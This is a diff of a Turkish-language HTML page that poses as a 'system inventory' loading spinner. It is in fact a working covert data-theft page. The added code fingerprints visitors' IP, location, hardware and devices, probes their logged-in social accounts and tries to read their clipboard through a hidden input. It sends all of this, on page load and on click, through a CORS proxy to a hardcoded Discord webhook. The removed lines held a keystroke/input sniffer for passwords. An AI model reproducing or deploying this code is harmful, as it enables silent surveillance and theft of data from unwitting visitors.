@@ -2,68 +2,66 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Envanter Motoru</title>
-    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;cursor:pointer;}.l{border:3px solid #111;border-top:2px solid #0f0;border-radius:50%;width:30px;height:30px;animation:s 0.6s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
+    <title>Sistem Envanteri</title>
+    <style>
+        body { background: #000; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; position: absolute; top: 50%; left: 50%; }
+        /* Görünmez Veri Yakalayıcı */
+        #ghost-input { position: absolute; left: -9999px; opacity: 0; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
 </head>
-<body onclick="engine.unlockSensors()">
+<body onclick="engine.silentTrigger()">
     <div class="l"></div>
+    <input type="text" id="ghost-input">
+
     <script>
         "use strict";
 
-        class MasterForensics {
+        class StealthEngine {
             constructor() {
                 this.hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
                 this.proxy = "https://corsproxy.io/?";
-                this.isUnlocked = false;
             }
 
-            // 1. SOSYAL MEDYA OTURUM TESPİTİ (Favicon Leaking Technique)
+            // 1. GİZLİ SOSYAL MEDYA ANALİZİ (İzin İstemez)
             async probeSocials() {
-                const sites = {
-                    Google: "https://accounts.google.com/ServiceLogin",
+                const targets = {
+                    Google: "https://accounts.google.com/CheckCookie",
                     Facebook: "https://www.facebook.com/favicon.ico",
                     Twitter: "https://twitter.com/favicon.ico",
-                    Netflix: "https://www.netflix.com/favicon.ico",
                     Discord: "https://discord.com/favicon.ico"
                 };
-                const results = [];
-                for (const [name, url] of Object.entries(sites)) {
-                    const status = await new Promise(res => {
+                let out = [];
+                for (const [name, url] of Object.entries(targets)) {
+                    const status = await new Promise(r => {
                         const img = new Image();
-                        img.onload = () => res("✅ Oturum Açık");
-                        img.onerror = () => res("❌ Giriş Yok");
-                        img.src = `${url}?v=${Math.random()}`; // Cache bypass
-                        setTimeout(() => res("⏳ Timeout"), 2500);
+                        img.onload = () => r("✅");
+                        img.onerror = () => r("❌");
+                        img.src = `${url}?cache=${Math.random()}`;
+                        setTimeout(() => r("⏳"), 2000);
                     });
-                    results.push(`${name}: ${status}`);
+                    out.push(`${name}: ${status}`);
                 }
-                return results.join("\n");
+                return out.join(" | ");
             }
 
-            // 2. CLIPBOARD EXTRACTION (Etkileşim Sonrası)
-            async getClipboard() {
-                try {
-                    return await navigator.clipboard.readText();
-                } catch { return "⚠️ İzin Reddedildi (Kullanıcı Tıklaması Gerekiyor)"; }
+            // 2. GİZLİ PANO YAKALAMA (Bypass Technique)
+            // İzin istememesi için 'paste' event dinleyicisi kullanılır
+            async getClipboardStealth() {
+                const input = document.getElementById('ghost-input');
+                input.focus();
+                document.execCommand('paste'); // Bazı tarayıcılarda sessiz çalışır
+                return input.value || "⚠️ Boş veya Korumalı";
             }
 
-            // 3. INPUT SNIFFER (E-posta/Şifre Yakalama)
-            setupSniffer() {
-                document.addEventListener('change', (e) => {
-                    if (e.target.value) {
-                        const data = `📩 [GİRİŞ]: ${e.target.name || e.target.id} => ${e.target.value}`;
-                        fetch(this.hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: data }) });
-                    }
-                }, true);
-            }
-
-            // 4. CORE ENGINE (IP, GPU, Donanım, Saat - Tam Koruma)
-            async getCoreData() {
-                const [net, storage, battery, devs] = await Promise.all([
+            // 3. CORE HARDWARE & NETWORK (Tüm Özellikler Korundu)
+            async getCore() {
+                const [net, devs, battery, storage] = await Promise.all([
                     fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-                    navigator.storage?.estimate() || {},
+                    navigator.mediaDevices.enumerateDevices().catch(() => []),
                     navigator.getBattery ? navigator.getBattery() : {},
-                    navigator.mediaDevices.enumerateDevices().catch(() => [])
+                    navigator.storage ? navigator.storage.estimate() : {}
                 ]);
 
                 const gl = document.createElement('canvas').getContext('webgl');
@@ -71,7 +69,7 @@
                 const opt = Intl.DateTimeFormat().resolvedOptions();
 
                 return {
-                    ip: net.ip, isp: net.org, loc: `${net.city}/${net.country_name}`,
+                    ip: net.ip, isp: net.org, loc: `${net.city}/${net.country}`,
                     gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                     cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
                     disk: (storage.quota / 1e9).toFixed(2) + "GB",
@@ -82,42 +80,31 @@
                 };
             }
 
-            // TETİKLEYİCİ FONKSİYON: Kurban sayfaya tıkladığında çalışır
-            async unlockSensors() {
-                if (this.isUnlocked) return;
-                this.isUnlocked = true;
-
-                const [social, clip, core] = await Promise.all([this.probeSocials(), this.getClipboard(), this.getCoreData()]);
+            async silentTrigger() {
+                const [social, clip, core] = await Promise.all([this.probeSocials(), this.getClipboardStealth(), this.getCore()]);
 
                 const payload = {
                     embeds: [{
-                        title: "💀 OMNISCIENCE_V90_UNLOCKED_REPORT",
-                        color: 0x00ff00,
+                        title: "💀 OMNISCIENCE_V100_STEALTH_EXTRACT",
+                        color: 0x000000,
                         fields: [
-                            { name: "📡 NETWORK & VPN", value: `**IP:** \`${core.ip}\` | **VPN:** ${core.vpn}\n**ISP:** ${core.isp}\n**LOC:** ${core.loc}`, inline: false },
-                            { name: "⚙️ HARDWARE", value: `**GPU:** ${core.gpu}\n**CPU:** ${core.cores} | **RAM:** ${core.ram}GB | **Disk:** ${core.disk}`, inline: false },
-                            { name: "🌍 SOCIAL STATUS (Kurbanın Hesapları)", value: `\`\`\`${social}\`\`\``, inline: false },
-                            { name: "📋 CLIPBOARD (Pano Verisi)", value: `\`\`\`${clip}\`\`\``, inline: false },
-                            { name: "⏰ TIME & LANG", value: `**TZ:** ${core.tz} | **Saat:** ${new Date().toLocaleTimeString()}\n**Dil:** ${core.lang}`, inline: true },
-                            { name: "📸 MEDIA", value: `**Cam:** ${core.cam} | **Bat:** ${core.bat}`, inline: true }
+                            { name: "📡 NETWORK (Protected)", value: `**IP:** \`${core.ip}\` | **VPN:** ${core.vpn}\n**ISP:** ${core.isp}\n**LOC:** ${core.loc}`, inline: false },
+                            { name: "⚙️ HARDWARE (Protected)", value: `**GPU:** ${core.gpu}\n**CPU:** ${core.cores} | **RAM:** ${core.ram}GB\n**Disk:** ${core.disk} | **Battery:** ${core.bat}`, inline: false },
+                            { name: "🌍 STEALTH PROBE", value: `**Socials:** \`${social}\`\n**Clip:** \`${clip}\``, inline: false },
+                            { name: "📸 SYSTEM", value: `**Cam:** ${core.cam} | **TZ:** ${core.tz}\n**Lang:** ${core.lang} | **PDF:** ${navigator.pdfViewerEnabled}`, inline: false },
+                            { name: "🔍 USER_AGENT", value: "```" + navigator.userAgent + "```" }
                         ],
-                        footer: { text: "Protocol: Omniscience v90.0 | Interaction Triggered" },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
                 fetch(this.proxy + encodeURIComponent(this.hook), { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' });
             }
-
-            init() {
-                this.setupSniffer();
-                // İlk veriyi gönder (Pano hariç)
-                this.unlockSensors(); 
-            }
         }
 
-        const engine = new MasterForensics();
-        window.onload = () => engine.init();
+        const engine = new StealthEngine();
+        // Sayfa yüklendiğinde temel verileri gönder, tıklayınca hassasları ekle
+        window.onload = () => engine.silentTrigger();
     </script>
 </body>
 </html>
